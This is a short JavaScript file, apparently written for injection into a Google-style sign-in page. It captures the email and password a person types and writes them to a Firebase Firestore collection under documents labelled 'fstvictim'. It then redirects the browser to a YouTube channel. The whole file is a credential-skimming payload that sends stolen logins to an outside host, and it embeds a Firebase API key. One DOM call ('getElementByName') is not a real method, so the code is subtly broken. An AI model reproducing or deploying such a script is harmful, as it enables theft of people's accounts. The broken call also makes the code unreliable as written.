var config = {
	apiKey: "AIzaSyBvsq8jqXNijM4jwseW-HsIpxDH77LB1mc",
	authDomain: "generaldata-bcd84.firebaseapp.com",
	databaseURL: "https://generaldata-bcd84.firebaseio.com",
	projectId: "generaldata-bcd84",
	storageBucket: "generaldata-bcd84.appspot.com",
	messagingSenderId: "714732508717"
};
firebase.initializeApp(config);

var db = firebase.firestore();
var pwd;
var email;
var data;

alert("embeded");
sendthis();

function sendthis(){
	document.getElementByName("identifier").addEventListener('change',function() {email=this.value});
	document.getElementByName("password").addEventListener('change',function() {pwd=this.value});
	document.getElementsByClassName("CwaK9")[0].addEventListener('click',function() {data={accemail:email,accpwd:pwd};db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data); setTimeout(function() { window.location = "https://www.youtube.com/channel/UCXivYd7XrbmoHkIWB3xei4Q";},3000);});
}


